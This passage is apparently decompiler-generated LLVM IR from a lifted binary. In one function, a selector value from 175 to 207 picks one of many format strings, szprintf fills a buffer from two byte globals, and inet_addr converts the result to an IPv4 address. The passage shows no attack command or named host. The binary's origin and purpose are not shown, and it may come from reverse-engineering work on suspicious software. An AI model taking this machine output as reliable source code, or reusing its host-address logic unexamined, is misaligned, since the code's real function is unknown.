  %v8_cd94 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cdd4.402 to i32), i32 %v4_cd94, i32 %v6_cd94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd98

dec_label_pc_cd98:                                ; preds = %dec_label_pc_cd64, %dec_label_pc_cd70
  %v7_cd9c = icmp eq i32 %v2_a7e4, 175
  br i1 %v7_cd9c, label %dec_label_pc_cda4, label %dec_label_pc_cdcc

dec_label_pc_cda4:                                ; preds = %dec_label_pc_cd98
  %v3_cdb0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cdbc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cdc8 = sext i8 %v3_cdb0 to i32
  %v6_cdc8 = sext i8 %v3_cdbc to i32
  %v8_cdc8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cde4.404 to i32), i32 %v4_cdc8, i32 %v6_cdc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdcc

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cd98, %dec_label_pc_cda4
  %v7_cdd0 = icmp eq i32 %v2_a7e4, 176
  br i1 %v7_cdd0, label %dec_label_pc_cdd8, label %dec_label_pc_ce00

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdcc
  %v3_cde4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cdf0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cdfc = sext i8 %v3_cde4 to i32
  %v6_cdfc = sext i8 %v3_cdf0 to i32
  %v8_cdfc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cdf4.406 to i32), i32 %v4_cdfc, i32 %v6_cdfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce00

dec_label_pc_ce00:                                ; preds = %dec_label_pc_cdcc, %dec_label_pc_cdd8
  %v7_ce04 = icmp eq i32 %v2_a7e4, 177
  br i1 %v7_ce04, label %dec_label_pc_ce0c, label %dec_label_pc_ce34

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_ce00
  %v3_ce18 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ce24 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ce30 = sext i8 %v3_ce18 to i32
  %v6_ce30 = sext i8 %v3_ce24 to i32
  %v8_ce30 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ce04.408 to i32), i32 %v4_ce30, i32 %v6_ce30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_ce00, %dec_label_pc_ce0c
  %v7_ce38 = icmp eq i32 %v2_a7e4, 178
  br i1 %v7_ce38, label %dec_label_pc_ce40, label %dec_label_pc_ce68

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce34
  %v3_ce4c = load i8, i8* @global_var_28c59.70, align 1
  %v3_ce58 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ce64 = sext i8 %v3_ce4c to i32
  %v6_ce64 = sext i8 %v3_ce58 to i32
  %v8_ce64 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ce14.410 to i32), i32 %v4_ce64, i32 %v6_ce64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %dec_label_pc_ce34, %dec_label_pc_ce40
  %v7_ce6c = icmp eq i32 %v2_a7e4, 179
  br i1 %v7_ce6c, label %dec_label_pc_ce74, label %dec_label_pc_ce9c

dec_label_pc_ce74:                                ; preds = %dec_label_pc_ce68
  %v3_ce80 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ce8c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ce98 = sext i8 %v3_ce80 to i32
  %v6_ce98 = sext i8 %v3_ce8c to i32
  %v8_ce98 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ce24.412 to i32), i32 %v4_ce98, i32 %v6_ce98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce9c

dec_label_pc_ce9c:                                ; preds = %dec_label_pc_ce68, %dec_label_pc_ce74
  %v7_cea0 = icmp eq i32 %v2_a7e4, 180
  br i1 %v7_cea0, label %dec_label_pc_cea8, label %dec_label_pc_ced0

dec_label_pc_cea8:                                ; preds = %dec_label_pc_ce9c
  %v3_ceb4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cec0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cecc = sext i8 %v3_ceb4 to i32
  %v6_cecc = sext i8 %v3_cec0 to i32
  %v8_cecc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ce34.414 to i32), i32 %v4_cecc, i32 %v6_cecc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ced0

dec_label_pc_ced0:                                ; preds = %dec_label_pc_ce9c, %dec_label_pc_cea8
  %v7_ced4 = icmp eq i32 %v2_a7e4, 181
  br i1 %v7_ced4, label %dec_label_pc_cedc, label %dec_label_pc_cf04

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ced0
  %v3_cee8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cef4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cf00 = sext i8 %v3_cee8 to i32
  %v6_cf00 = sext i8 %v3_cef4 to i32
  %v8_cf00 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ce44.416 to i32), i32 %v4_cf00, i32 %v6_cf00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf04

dec_label_pc_cf04:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cedc
  %v7_cf08 = icmp eq i32 %v2_a7e4, 182
  br i1 %v7_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cf38

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cf04
  %v3_cf1c = load i8, i8* @global_var_28c59.70, align 1
  %v3_cf28 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cf34 = sext i8 %v3_cf1c to i32
  %v6_cf34 = sext i8 %v3_cf28 to i32
  %v8_cf34 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ce54.418 to i32), i32 %v4_cf34, i32 %v6_cf34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf04, %dec_label_pc_cf10
  %v7_cf3c = icmp eq i32 %v2_a7e4, 183
  br i1 %v7_cf3c, label %dec_label_pc_cf44, label %dec_label_pc_cf6c

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf38
  %v3_cf50 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cf5c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cf68 = sext i8 %v3_cf50 to i32
  %v6_cf68 = sext i8 %v3_cf5c to i32
  %v8_cf68 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c654.157 to i32), i32 %v4_cf68, i32 %v6_cf68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf6c

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf38, %dec_label_pc_cf44
  %v7_cf70 = icmp eq i32 %v2_a7e4, 184
  br i1 %v7_cf70, label %dec_label_pc_cf78, label %dec_label_pc_cfa0

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf6c
  %v3_cf84 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cf90 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cf9c = sext i8 %v3_cf84 to i32
  %v6_cf9c = sext i8 %v3_cf90 to i32
  %v8_cf9c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ce64.421 to i32), i32 %v4_cf9c, i32 %v6_cf9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfa0

dec_label_pc_cfa0:                                ; preds = %dec_label_pc_cf6c, %dec_label_pc_cf78
  %v7_cfa4 = icmp eq i32 %v2_a7e4, 185
  br i1 %v7_cfa4, label %dec_label_pc_cfac, label %dec_label_pc_cfd4

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cfa0
  %v3_cfb8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cfc4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cfd0 = sext i8 %v3_cfb8 to i32
  %v6_cfd0 = sext i8 %v3_cfc4 to i32
  %v8_cfd0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ce74.423 to i32), i32 %v4_cfd0, i32 %v6_cfd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cfa0, %dec_label_pc_cfac
  %v7_cfd8 = icmp eq i32 %v2_a7e4, 186
  br i1 %v7_cfd8, label %dec_label_pc_cfe0, label %dec_label_pc_d008

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_cfd4
  %v3_cfec = load i8, i8* @global_var_28c59.70, align 1
  %v3_cff8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d004 = sext i8 %v3_cfec to i32
  %v6_d004 = sext i8 %v3_cff8 to i32
  %v8_d004 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ce84.425 to i32), i32 %v4_d004, i32 %v6_d004, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d008

dec_label_pc_d008:                                ; preds = %dec_label_pc_cfd4, %dec_label_pc_cfe0
  %v7_d00c = icmp eq i32 %v2_a7e4, 187
  br i1 %v7_d00c, label %dec_label_pc_d014, label %dec_label_pc_d03c

dec_label_pc_d014:                                ; preds = %dec_label_pc_d008
  %v3_d020 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d02c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d038 = sext i8 %v3_d020 to i32
  %v6_d038 = sext i8 %v3_d02c to i32
  %v8_d038 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ce94.427 to i32), i32 %v4_d038, i32 %v6_d038, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d03c

dec_label_pc_d03c:                                ; preds = %dec_label_pc_d008, %dec_label_pc_d014
  %v7_d040 = icmp eq i32 %v2_a7e4, 188
  br i1 %v7_d040, label %dec_label_pc_d048, label %dec_label_pc_d070

dec_label_pc_d048:                                ; preds = %dec_label_pc_d03c
  %v3_d054 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d060 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d06c = sext i8 %v3_d054 to i32
  %v6_d06c = sext i8 %v3_d060 to i32
  %v8_d06c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cea4.429 to i32), i32 %v4_d06c, i32 %v6_d06c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d070

dec_label_pc_d070:                                ; preds = %dec_label_pc_d03c, %dec_label_pc_d048
  %v7_d074 = icmp eq i32 %v2_a7e4, 189
  br i1 %v7_d074, label %dec_label_pc_d07c, label %dec_label_pc_d0a4

dec_label_pc_d07c:                                ; preds = %dec_label_pc_d070
  %v3_d088 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d094 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d0a0 = sext i8 %v3_d088 to i32
  %v6_d0a0 = sext i8 %v3_d094 to i32
  %v8_d0a0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ceb4.431 to i32), i32 %v4_d0a0, i32 %v6_d0a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d070, %dec_label_pc_d07c
  %v7_d0a8 = icmp eq i32 %v2_a7e4, 190
  br i1 %v7_d0a8, label %dec_label_pc_d0b0, label %dec_label_pc_d0d8

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d0a4
  %v3_d0bc = load i8, i8* @global_var_28c59.70, align 1
  %v3_d0c8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d0d4 = sext i8 %v3_d0bc to i32
  %v6_d0d4 = sext i8 %v3_d0c8 to i32
  %v8_d0d4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cec4.433 to i32), i32 %v4_d0d4, i32 %v6_d0d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0d8

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0a4, %dec_label_pc_d0b0
  %v7_d0dc = icmp eq i32 %v2_a7e4, 191
  br i1 %v7_d0dc, label %dec_label_pc_d0e4, label %dec_label_pc_d10c

dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0d8
  %v3_d0f0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d0fc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d108 = sext i8 %v3_d0f0 to i32
  %v6_d108 = sext i8 %v3_d0fc to i32
  %v8_d108 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ced4.435 to i32), i32 %v4_d108, i32 %v6_d108, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d10c

dec_label_pc_d10c:                                ; preds = %dec_label_pc_d0d8, %dec_label_pc_d0e4
  %v7_d110 = icmp eq i32 %v2_a7e4, 192
  br i1 %v7_d110, label %dec_label_pc_d118, label %dec_label_pc_d140

dec_label_pc_d118:                                ; preds = %dec_label_pc_d10c
  %v3_d124 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d130 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d13c = sext i8 %v3_d124 to i32
  %v6_d13c = sext i8 %v3_d130 to i32
  %v8_d13c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cee4.437 to i32), i32 %v4_d13c, i32 %v6_d13c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d140

dec_label_pc_d140:                                ; preds = %dec_label_pc_d10c, %dec_label_pc_d118
  %v7_d144 = icmp eq i32 %v2_a7e4, 193
  br i1 %v7_d144, label %dec_label_pc_d14c, label %dec_label_pc_d174

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d140
  %v3_d158 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d164 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d170 = sext i8 %v3_d158 to i32
  %v6_d170 = sext i8 %v3_d164 to i32
  %v8_d170 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cef4.439 to i32), i32 %v4_d170, i32 %v6_d170, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d174

dec_label_pc_d174:                                ; preds = %dec_label_pc_d140, %dec_label_pc_d14c
  %v7_d178 = icmp eq i32 %v2_a7e4, 194
  br i1 %v7_d178, label %dec_label_pc_d180, label %dec_label_pc_d1a8

dec_label_pc_d180:                                ; preds = %dec_label_pc_d174
  %v3_d18c = load i8, i8* @global_var_28c59.70, align 1
  %v3_d198 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d1a4 = sext i8 %v3_d18c to i32
  %v6_d1a4 = sext i8 %v3_d198 to i32
  %v8_d1a4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf04.441 to i32), i32 %v4_d1a4, i32 %v6_d1a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1a8

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d174, %dec_label_pc_d180
  %v7_d1ac = icmp eq i32 %v2_a7e4, 195
  br i1 %v7_d1ac, label %dec_label_pc_d1b4, label %dec_label_pc_d1dc

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d1a8
  %v3_d1c0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d1cc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d1d8 = sext i8 %v3_d1c0 to i32
  %v6_d1d8 = sext i8 %v3_d1cc to i32
  %v8_d1d8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf14.443 to i32), i32 %v4_d1d8, i32 %v6_d1d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d1a8, %dec_label_pc_d1b4
  %v7_d1e0 = icmp eq i32 %v2_a7e4, 196
  br i1 %v7_d1e0, label %dec_label_pc_d1e8, label %dec_label_pc_d210

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1dc
  %v3_d1f4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d200 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d20c = sext i8 %v3_d1f4 to i32
  %v6_d20c = sext i8 %v3_d200 to i32
  %v8_d20c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf24.445 to i32), i32 %v4_d20c, i32 %v6_d20c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d210

dec_label_pc_d210:                                ; preds = %dec_label_pc_d1dc, %dec_label_pc_d1e8
  %v7_d214 = icmp eq i32 %v2_a7e4, 197
  br i1 %v7_d214, label %dec_label_pc_d21c, label %dec_label_pc_d244

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d210
  %v3_d228 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d234 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d240 = sext i8 %v3_d228 to i32
  %v6_d240 = sext i8 %v3_d234 to i32
  %v8_d240 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf34.447 to i32), i32 %v4_d240, i32 %v6_d240, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d210, %dec_label_pc_d21c
  %v7_d248 = icmp eq i32 %v2_a7e4, 198
  br i1 %v7_d248, label %dec_label_pc_d250, label %dec_label_pc_d278

dec_label_pc_d250:                                ; preds = %dec_label_pc_d244
  %v3_d25c = load i8, i8* @global_var_28c59.70, align 1
  %v3_d268 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d274 = sext i8 %v3_d25c to i32
  %v6_d274 = sext i8 %v3_d268 to i32
  %v8_d274 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf44.449 to i32), i32 %v4_d274, i32 %v6_d274, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d244, %dec_label_pc_d250
  %v7_d27c = icmp eq i32 %v2_a7e4, 199
  br i1 %v7_d27c, label %dec_label_pc_d284, label %dec_label_pc_d2ac

dec_label_pc_d284:                                ; preds = %dec_label_pc_d278
  %v3_d290 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d29c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d2a8 = sext i8 %v3_d290 to i32
  %v6_d2a8 = sext i8 %v3_d29c to i32
  %v8_d2a8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf54.451 to i32), i32 %v4_d2a8, i32 %v6_d2a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d284
  %v7_d2b0 = icmp eq i32 %v2_a7e4, 200
  br i1 %v7_d2b0, label %dec_label_pc_d2b8, label %dec_label_pc_d2e0

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2ac
  %v3_d2c4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d2d0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d2dc = sext i8 %v3_d2c4 to i32
  %v6_d2dc = sext i8 %v3_d2d0 to i32
  %v8_d2dc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf64.453 to i32), i32 %v4_d2dc, i32 %v6_d2dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2e0

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d2ac, %dec_label_pc_d2b8
  %v7_d2e4 = icmp eq i32 %v2_a7e4, 201
  br i1 %v7_d2e4, label %dec_label_pc_d320, label %dec_label_pc_d314

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2e0
  br label %dec_label_pc_d348

dec_label_pc_d320:                                ; preds = %dec_label_pc_d2e0
  %v3_d2f8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d304 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d310 = sext i8 %v3_d2f8 to i32
  %v6_d310 = sext i8 %v3_d304 to i32
  %v8_d310 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cf74.455 to i32), i32 %v4_d310, i32 %v6_d310, i32 ptrtoint (i32* @0 to i32))
  %v3_d32c = load i8, i8* @global_var_28c59.70, align 1
  %v3_d338 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d344 = sext i8 %v3_d32c to i32
  %v6_d344 = sext i8 %v3_d338 to i32
  %v8_d344 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cf84.457 to i32), i32 %v4_d344, i32 %v6_d344, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %dec_label_pc_d314, %dec_label_pc_d320
  %v7_d34c = icmp eq i32 %v2_a7e4, 202
  br i1 %v7_d34c, label %dec_label_pc_d354, label %dec_label_pc_d37c

dec_label_pc_d354:                                ; preds = %dec_label_pc_d348
  %v3_d360 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d36c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d378 = sext i8 %v3_d360 to i32
  %v6_d378 = sext i8 %v3_d36c to i32
  %v8_d378 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cf94.459 to i32), i32 %v4_d378, i32 %v6_d378, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d348, %dec_label_pc_d354
  %v7_d380 = icmp eq i32 %v2_a7e4, 203
  br i1 %v7_d380, label %dec_label_pc_d388, label %dec_label_pc_d3b0

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c
  %v3_d394 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d3a0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d3ac = sext i8 %v3_d394 to i32
  %v6_d3ac = sext i8 %v3_d3a0 to i32
  %v8_d3ac = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cfa4.461 to i32), i32 %v4_d3ac, i32 %v6_d3ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d388
  %v7_d3b4 = icmp eq i32 %v2_a7e4, 204
  br i1 %v7_d3b4, label %dec_label_pc_d3bc, label %dec_label_pc_d3e4

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d3b0
  %v3_d3c8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d3d4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d3e0 = sext i8 %v3_d3c8 to i32
  %v6_d3e0 = sext i8 %v3_d3d4 to i32
  %v8_d3e0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cfb4.463 to i32), i32 %v4_d3e0, i32 %v6_d3e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3e4

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3b0, %dec_label_pc_d3bc
  %v7_d3e8 = icmp eq i32 %v2_a7e4, 205
  br i1 %v7_d3e8, label %dec_label_pc_d3f0, label %dec_label_pc_d418

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d3e4
  %v3_d3fc = load i8, i8* @global_var_28c59.70, align 1
  %v3_d408 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d414 = sext i8 %v3_d3fc to i32
  %v6_d414 = sext i8 %v3_d408 to i32
  %v8_d414 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cfc4.465 to i32), i32 %v4_d414, i32 %v6_d414, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d418

dec_label_pc_d418:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d3f0
  %v7_d41c = icmp eq i32 %v2_a7e4, 206
  br i1 %v7_d41c, label %dec_label_pc_d424, label %dec_label_pc_d44c

dec_label_pc_d424:                                ; preds = %dec_label_pc_d418
  %v3_d430 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d43c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d448 = sext i8 %v3_d430 to i32
  %v6_d448 = sext i8 %v3_d43c to i32
  %v8_d448 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cfd4.467 to i32), i32 %v4_d448, i32 %v6_d448, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d418, %dec_label_pc_d424
  %v7_d450 = icmp eq i32 %v2_a7e4, 207
  br i1 %v7_d450, label %dec_label_pc_d458, label %dec_label_pc_d480

dec_label_pc_d458:                                ; preds = %dec_label_pc_d44c
  %v3_d464 = load i8, i8* @global_var_28c59.70, align 1
  %v3_d470 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_d47c = sext i8 %v3_d464 to i32
  %v6_d47c = sext i8 %v3_d470 to i32
  %v8_d47c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cfe4.469 to i32), i32 %v4_d47c, i32 %v6_d47c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d44c, %dec_label_pc_d458
  store i32 %v2_a710, i32* @r0, align 4
  %v1_d4bc = call i32 @inet_addr(i32 %v2_a710)
  store i32 %v3_a708, i32* @fp, align 4
  ret i32 %v1_d4bc

; uselistorder directives
  uselistorder i32 %v2_a710, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1cd14.377 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1cca8.362 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1cb18.312 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ca8c.294 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ca2c.282 to i32), { 1, 0 }
  uselistorder i32 65, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1c674.161 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1c654.157 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1c644.155 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1c614.149 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d44c, { 1, 0 }
  uselistorder label %dec_label_pc_d418, { 1, 0 }
  uselistorder label %dec_label_pc_d3e4, { 1, 0 }
  uselistorder label %dec_label_pc_d3b0, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
  uselistorder label %dec_label_pc_d2e0, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %dec_label_pc_d210, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
  uselistorder label %dec_label_pc_d1a8, { 1, 0 }
  uselistorder label %dec_label_pc_d174, { 1, 0 }
  uselistorder label %dec_label_pc_d140, { 1, 0 }
